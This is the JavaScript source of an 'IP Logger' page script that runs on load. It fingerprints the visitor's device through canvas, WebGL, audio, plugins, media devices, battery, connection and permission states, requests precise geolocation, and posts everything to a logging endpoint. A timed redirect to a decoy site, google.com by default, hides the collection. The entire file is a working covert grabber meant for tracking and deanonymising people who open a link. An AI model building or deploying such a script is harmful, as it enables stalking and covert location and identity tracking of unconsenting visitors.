/**
 * IP Logger - Client-side Data Collection Script
 * Collects comprehensive device, browser, and location information
 */

(function () {
    "use strict";

    const REDIRECT_URL = window.__REDIRECT_URL__ || "https://www.google.com";
    const LOG_API_URL = window.__LOG_API_URL__ || "/api/log";

    // Redirect after a short delay (even if logging fails)
    setTimeout(() => {
        window.location.href = REDIRECT_URL;
    }, 3000);

    /**
     * Main logging function
     */
    async function startLogging() {
        try {
            const data = await collectAllData();
            await sendData(data);
        } catch (error) {
            console.error("Logging error:", error);
        }
    }

    /**
     * Collect all available data
     */
    async function collectAllData() {
        const data = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
        };

        // Collect in parallel where possible
        const [
            screenInfo,
            browserInfo,
            locationData,
            canvasFP,
            webglFP,
            audioFP,
            mediaDevices,
            batteryInfo,
            connectionInfo,
            platformInfo,
            permissionsStatus,
        ] = await Promise.allSettled([
            Promise.resolve(getScreenInfo()),
            Promise.resolve(getBrowserInfo()),
            getLocationData(),
            getCanvasFingerprint(),
            getWebGLFingerprint(),
            getAudioFingerprint(),
            getMediaDevices(),
            getBatteryInfo(),
            getConnectionInfo(),
            getPlatformInfo(),
            checkPermissions(),
        ]);

        data.screen = screenInfo.status === "fulfilled" ? screenInfo.value : null;
        data.browser = browserInfo.status === "fulfilled" ? browserInfo.value : {};
        data.location = locationData.status === "fulfilled" ? locationData.value : {};
        data.canvas_fingerprint = canvasFP.status === "fulfilled" ? canvasFP.value : null;
        data.webgl_fingerprint = webglFP.status === "fulfilled" ? webglFP.value : null;
        data.audio_fingerprint = audioFP.status === "fulfilled" ? audioFP.value : null;
        data.media_devices = mediaDevices.status === "fulfilled" ? mediaDevices.value : [];
        data.battery = batteryInfo.status === "fulfilled" ? batteryInfo.value : null;
        data.connection = connectionInfo.status === "fulfilled" ? connectionInfo.value : {};
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.platform = platformInfo.status === "fulfilled" ? platformInfo.value : {};
        data.permissions = permissionsStatus.status === "fulfilled" ? permissionsStatus.value : {};

        return data;
    }

    /**
     * Send data to the server
     */
    async function sendData(data) {
        try {
            await fetch(LOG_API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data),
            });
        } catch (error) {
            console.error("Failed to send data:", error);
        }
    }

    /**
     * Get screen information
     */
    function getScreenInfo() {
        const s = window.screen;
        return {
            width: s.width,
            height: s.height,
            availWidth: s.availWidth,
            availHeight: s.availHeight,
            colorDepth: s.colorDepth,
            pixelDepth: s.pixelDepth,
            pixel_ratio: window.devicePixelRatio,
            orientation: screen.orientation ? screen.orientation.type : null,
        };
    }

    /**
     * Get browser information
     */
    function getBrowserInfo() {
        const nav = navigator;
        return {
            language: nav.language,
            languages: nav.languages,
            plugins: getPluginsList(),
            vendor: nav.vendor,
            product: nav.product,
            webdriver: nav.webdriver,
            maxTouchPoints: nav.maxTouchPoints,
            hardwareConcurrency: nav.hardwareConcurrency,
            deviceMemory: nav.deviceMemory,
            doNotTrack: nav.doNotTrack,
            cookieEnabled: nav.cookieEnabled,
            online: nav.onLine,
            // Feature detection
            webgl: !!window.WebGLRenderingContext,
            canvas: !!document.createElement("canvas").getContext,
            web_audio: !!window.AudioContext || !!window.webkitAudioContext,
            notifications: nav.permissions
                ? null
                : nav.notification || null,
            indexed_db: !!nav.indexedDB,
            local_storage: !!window.localStorage,
            service_worker: !!nav.serviceWorker,
        };
    }

    /**
     * Get plugins list
     */
    function getPluginsList() {
        if (!navigator.plugins || !navigator.plugins.length) return [];
        return Array.from(navigator.plugins).map((p) => ({
            name: p.name,
            filename: p.filename,
        }));
    }

    /**
     * Get location data with permission request
     */
    async function getLocationData() {
        const data = {};

        if (!navigator.geolocation) {
            data.permission = "not_supported";
            return data;
        }

        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    resolve,
                    reject,
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0,
                    }
                );
            });

            data.permission = "granted";
            data.latitude = position.coords.latitude;
            data.longitude = position.coords.longitude;
            data.accuracy = position.coords.accuracy;
            data.altitude = position.coords.altitude;
            data.altitudeAccuracy = position.coords.altitudeAccuracy;
            data.heading = position.coords.heading;
            data.speed = position.coords.speed;
            data.timestamp = position.timestamp;
        } catch (error) {
            data.permission = error.code === 1 ? "denied" : "error";
            data.error_message = error.message;
        }

        return data;
    }

    /**
     * Canvas fingerprinting
     */
    function getCanvasFingerprint() {
        try {
            const canvas = document.getElementById("fingerprint-canvas");
            if (!canvas) return null;
            const ctx = canvas.getContext("2d");
            if (!ctx) return null;

            // Draw complex text and shapes
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("IP Logger Fingerprint 🕵️", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("IP Logger Fingerprint 🕵️", 4, 17);

            // Add more complexity
            ctx.strokeStyle = "rgb(0, 0, 0)";
            ctx.beginPath();
            ctx.arc(100, 50, 30, 0, 2 * Math.PI);
            ctx.stroke();

            return canvas.toDataURL();
        } catch (e) {
            return null;
        }
    }

    /**
     * WebGL fingerprinting
     */
    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement("canvas");
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (!gl) return null;

            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            if (!debugInfo) return { vendor: null, renderer: null };

            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

            // Get more GPU info
            const maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
            const maxViewportDims = gl.getParameter(gl.MAX_VIEWPORT_DIMS);

            return {
                vendor: vendor,
                renderer: renderer,
                maxTextureSize: maxTextureSize,
                maxViewport: maxViewportDims,
            };
        } catch (e) {
            return null;
        }
    }

    /**
     * Audio fingerprinting
     */
    function getAudioFingerprint() {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const analyser = audioCtx.createAnalyser();

            oscillator.type = "triangle";
            oscillator.frequency.value = 1000;
            analyser.fftSize = 8192;

            oscillator.connect(analyser);
            analyser.connect(audioCtx.destination);
            oscillator.start(0);

            const data = new Float32Array(analyser.fftSize);
            analyser.getFloatTimeDomainData(data);

            oscillator.stop();
            audioCtx.close();

            // Create hash from audio data
            let hash = 0;
            for (let i = 0; i < data.length; i++) {
                hash = ((hash << 5) - hash) + Math.abs(data[i]) * 1000;
                hash = hash & hash;
            }

            return hash.toString(16);
        } catch (e) {
            return null;
        }
    }

    /**
     * Get media devices info
     */
    function getMediaDevices() {
        return new Promise((resolve) => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                resolve([]);
                return;
            }

            navigator.mediaDevices.enumerateDevices().then((devices) => {
                resolve(
                    devices.map((d) => ({
                        kind: d.kind,
                        label: d.label,
                        groupId: d.groupId,
                        deviceId: d.deviceId ? d.deviceId.substring(0, 10) + "..." : null,
                    }))
                );
            }).catch(() => {
                resolve([]);
            });
        });
    }

    /**
     * Get battery information
     */
    function getBatteryInfo() {
        return new Promise((resolve) => {
            if (!navigator.getBattery) {
                resolve(null);
                return;
            }

            navigator.getBattery().then((battery) => {
                resolve({
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                });

                // Update on change
                battery.addEventListener("chargingchange", () => {
                    // Could send updated data here
                });
            }).catch(() => {
                resolve(null);
            });
        });
    }

    /**
     * Get network connection info
     */
    function getConnectionInfo() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!conn) return {};

        return {
            effectiveType: conn.effectiveType,
            downlink: conn.downlink,
            downlinkMax: conn.downlinkMax,
            rtt: conn.rtt,
            saveData: conn.saveData,
            type: conn.type,
        };
    }

    /**
     * Get platform information
     */
    function getPlatformInfo() {
        return {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            appVersion: navigator.appVersion,
            userLanguage: navigator.userLanguage || navigator.language,
            systemLanguage: navigator.systemLanguage || navigator.language,
        };
    }

    /**
     * Check permissions status
     */
    async function checkPermissions() {
        const permissions = {};

        if (!navigator.permissions) {
            return permissions;
        }

        const permsToCheck = [
            "geolocation",
            "notifications",
            "camera",
            "microphone",
            "accelerometer",
            "gyroscope",
            "magnetometer",
            "clipboard-read",
            "clipboard-write",
        ];

        for (const perm of permsToCheck) {
            try {
                const result = await navigator.permissions.query({ name: perm });
                permissions[perm] = {
                    state: result.state,
                };
            } catch (e) {
                permissions[perm] = {
                    state: "unknown",
                };
            }
        }

        return permissions;
    }

    // Start logging when page loads
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", startLogging);
    } else {
        startLogging();
    }
})();
